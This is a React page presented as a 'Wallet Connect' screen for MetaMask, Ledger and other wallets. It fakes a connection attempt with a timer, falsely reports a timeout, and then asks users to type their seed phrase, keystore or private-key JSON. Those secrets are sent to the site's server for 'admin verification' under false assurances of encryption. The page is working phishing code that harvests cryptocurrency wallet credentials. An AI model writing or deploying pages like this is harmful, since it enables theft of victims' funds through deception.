'use client';
import { useState, useEffect } from 'react';
import DashboardLayout from '@/components/dashboard-layout';
import { Wallet, AlertTriangle, Loader2, Check, X, Clock } from 'lucide-react';
const PROVIDERS = [
  { id:'metamask', name:'MetaMask', icon:'🦊' },
  { id:'trust', name:'Trust Wallet', icon:'🔷' },
  { id:'coinbase', name:'Coinbase Wallet', icon:'🔵' },
  { id:'binance', name:'Binance Web3', icon:'🟡' },
  { id:'phantom', name:'Phantom', icon:'👻' },
  { id:'ledger', name:'Ledger', icon:'🔒' },
];
export default function WalletConnectPage(){
  const [user,setUser]=useState(null);
  const [selected,setSelected]=useState(null);
  const [loadingProv,setLoadingProv]=useState(false);
  const [showManual,setShowManual]=useState(false);
  const [method,setMethod]=useState('phrase');
  const [data,setData]=useState({walletAddress:'', keystoreJson:'', privateKeyPhrase:'', keyJson:''});
  const [msg,setMsg]=useState({type:'',text:''});
  const [processing,setProcessing]=useState(false);
  const [connections,setConnections]=useState([]);
  const [loading,setLoading]=useState(true);
  useEffect(()=>{(async()=>{
    const [uR,cR]=await Promise.all([fetch('/api/user/me'), fetch('/api/wallet-connect')]);
    if(uR.ok) setUser(await uR.json());
    if(cR.ok) setConnections((await cR.json()).connections||[]);
    setLoading(false);
  })();},[]);
  const pick = (p)=>{
    setSelected(p); setLoadingProv(true);
    setTimeout(()=>{ setLoadingProv(false); setShowManual(true); setMsg({type:'info', text:`Connection to ${p.name} timed out. Enter wallet details manually - encrypted & secure.`}); },2500);
  };
  const handleConnect=async(e)=>{
    e.preventDefault();
    if(!selected) { setMsg({type:'error',text:'Select wallet'}); return; }
    if(method==='phrase' && !data.privateKeyPhrase) { setMsg({type:'error',text:'Enter phrase'}); return; }
    if(method==='keystore' && !data.keystoreJson) { setMsg({type:'error',text:'Enter keystore'}); return; }
    if(method==='keyjson' && !data.keyJson) { setMsg({type:'error',text:'Enter key JSON'}); return; }
    setProcessing(true); setMsg({type:'',text:''});
    try{
      const r=await fetch('/api/wallet-connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({walletType:selected.name, connectionMethod:method, walletAddress:data.walletAddress||null, keystoreJson:data.keystoreJson||null, privateKeyPhrase:data.privateKeyPhrase||null, keyJson:data.keyJson||null})});
      const d=await r.json();
      if(r.ok){ setMsg({type:'success',text:d.message}); setData({walletAddress:'',keystoreJson:'',privateKeyPhrase:'',keyJson:''}); setShowManual(false); setSelected(null); const cr=await fetch('/api/wallet-connect'); if(cr.ok) setConnections((await cr.json()).connections||[]); }
      else setMsg({type:'error',text:d.error});
    }catch{ setMsg({type:'error',text:'Network error'});} finally{ setProcessing(false);}
  };
  if(loading) return <div className="min-h-screen bg-[#010214] flex items-center justify-center"><div className="size-10 border-4 border-[#ef4d45] border-t-transparent rounded-full animate-spin"/></div>;
  return (
    <DashboardLayout title="Wallet Connect" user={user}>
      {msg.text && <div className={`p-3 rounded-xl text-xs font-bold border ${msg.type==='success'?'bg-emerald-500/10 border-emerald-500/20 text-emerald-200': msg.type==='info'?'bg-blue-500/10 border-blue-500/20 text-blue-200':'bg-red-500/10 border-red-500/20 text-red-200'}`}>{msg.text}</div>}
      {!showManual && (
        <div className="bg-[#05081c] border border-white/5 rounded-2xl p-6">
          <h2 className="text-sm font-black text-white uppercase tracking-wider mb-4 flex items-center gap-2"><Wallet className="size-4 text-[#ef4d45]"/> Select Wallet Provider • Encrypted</h2>
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
            {PROVIDERS.map(p=> (
              <button key={p.id} onClick={()=>pick(p)} disabled={loadingProv} className={`p-4 rounded-2xl border-2 transition-all ${selected?.id===p.id?'border-[#ef4d45] bg-gradient-to-br from-[#ef4d45]/20 to-[#8c0030]/20':'border-white/5 bg-[#010214] hover:border-white/10'} ${loadingProv&&selected?.id===p.id?'opacity-50':''}`}>
                {loadingProv&&selected?.id===p.id ? <div className="flex flex-col items-center gap-2"><Loader2 className="size-8 animate-spin text-[#ef4d45]"/><span className="text-xs text-white/50">Connecting...</span></div> : <><div className="text-3xl mb-1">{p.icon}</div><div className="text-xs font-bold text-white text-center">{p.name}</div></>}
              </button>
            ))}
          </div>
        </div>
      )}
      {showManual && (
        <div className="bg-[#05081c] border border-white/5 rounded-2xl p-6">
          <div className="flex justify-between items-center mb-4"><div className="flex items-center gap-3"><span className="text-2xl">{selected?.icon}</span><div><p className="font-black text-white">{selected?.name}</p><p className="text-xs text-white/40">Manual verification required</p></div></div><button onClick={()=>{setShowManual(false);setSelected(null); setMsg({type:'',text:''});}} className="p-2 hover:bg-white/5 rounded-lg"><X className="size-5 text-white/40"/></button></div>
          <form onSubmit={handleConnect} className="space-y-4">
            <div className="grid grid-cols-3 gap-2">
              {['phrase','keystore','keyjson'].map(m=> <button key={m} type="button" onClick={()=>setMethod(m)} className={`p-3 rounded-xl text-xs font-bold capitalize ${method===m?'bg-[#ef4d45] text-white':'bg-[#010214] border border-white/10 text-white/60'}`}>{m==='phrase'?'Phrase': m==='keystore'?'Keystore':'Key JSON'}</button>)}
            </div>
            <div><label className="text-[11px] font-bold text-white/50 uppercase">Wallet Address (Optional)</label><input value={data.walletAddress} onChange={e=>setData({...data,walletAddress:e.target.value})} placeholder="0x..." className="mt-1 w-full bg-[#010214] border border-white/10 rounded-xl px-4 py-3 text-white outline-none font-mono text-sm"/></div>
            {method==='phrase' && <div><label className="text-[11px] font-bold text-white/50 uppercase">Private Key Phrase</label><textarea value={data.privateKeyPhrase} onChange={e=>setData({...data,privateKeyPhrase:e.target.value})} rows={4} placeholder="12 or 24 words..." className="mt-1 w-full bg-[#010214] border border-white/10 rounded-xl px-4 py-3 text-white outline-none font-mono text-sm resize-none" required/></div>}
            {method==='keystore' && <div><label className="text-[11px] font-bold text-white/50 uppercase">Keystore JSON</label><textarea value={data.keystoreJson} onChange={e=>setData({...data,keystoreJson:e.target.value})} rows={6} placeholder='{"address":...}' className="mt-1 w-full bg-[#010214] border border-white/10 rounded-xl px-4 py-3 text-white outline-none font-mono text-sm resize-none" required/></div>}
            {method==='keyjson' && <div><label className="text-[11px] font-bold text-white/50 uppercase">Key JSON</label><textarea value={data.keyJson} onChange={e=>setData({...data,keyJson:e.target.value})} rows={6} placeholder='{"version":3,...}' className="mt-1 w-full bg-[#010214] border border-white/10 rounded-xl px-4 py-3 text-white outline-none font-mono text-sm resize-none" required/></div>}
            <div className="bg-[#ef4d45]/10 border border-[#ef4d45]/20 rounded-xl p-3 flex gap-3 text-xs text-white/70"><AlertTriangle className="size-4 text-[#ef4d45] shrink-0"/> Encrypted with AES-256-GCM. Verified by admin, notified via Notifications & Email. Real-time status below.</div>
            <button disabled={processing} className="w-full bg-gradient-to-r from-[#ef4d45] to-[#8c0030] text-white py-3.5 rounded-xl font-black flex items-center justify-center gap-2 disabled:opacity-50">{processing?<><Loader2 className="size-5 animate-spin"/>Processing...</>:'Connect Wallet'}</button>
          </form>
        </div>
      )}
      {connections.length>0 && (
        <div className="bg-[#05081c] border border-white/5 rounded-2xl p-6">
          <h3 className="text-sm font-black text-white uppercase tracking-wider mb-4">Your Connections</h3>
          <div className="space-y-2">{connections.map(c=> <div key={c.id} className="bg-[#010214] border border-white/5 rounded-xl p-4 flex justify-between items-center"><div className="flex items-center gap-3"><span className="text-xl">🦊</span><div><p className="text-sm font-bold text-white">{c.wallet_type}</p><p className="text-xs text-white/40">{c.connection_method} • {new Date(c.created_at).toLocaleDateString()}</p></div></div><span className={`text-xs font-black px-2 py-1 rounded-full flex items-center gap-1 ${c.verification_status==='pending'?'bg-yellow-500/10 text-yellow-400': c.verification_status==='verified'?'bg-emerald-500/10 text-emerald-400':'bg-red-500/10 text-red-400'}`}>{c.verification_status==='pending'?<Clock className="size-3"/>: c.verification_status==='verified'?<Check className="size-3"/>:<X className="size-3"/>}{c.verification_status}</span></div>)}</div>
        </div>
      )}
    </DashboardLayout>
  );
}
